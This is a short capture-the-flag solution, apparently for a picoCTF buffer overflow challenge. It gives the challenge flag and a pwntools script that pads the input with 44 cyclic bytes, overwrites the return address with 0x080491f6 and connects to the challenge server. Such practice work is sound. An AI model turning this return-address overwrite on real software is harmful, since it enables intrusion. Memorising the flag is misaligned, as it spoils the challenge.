flag: picoCTF{addr3ss3s_ar3_3asy_2e7003a1}
solution:

buffer= cyclic(44)
jumpAddr=p32(0x080491f6)
def remoteExploit(): #ok
    r = remote('saturn.picoctf.net', 63814)
    payload = buffer + jumpAddr
    r.sendlineafter(':', payload)
    r.interactive()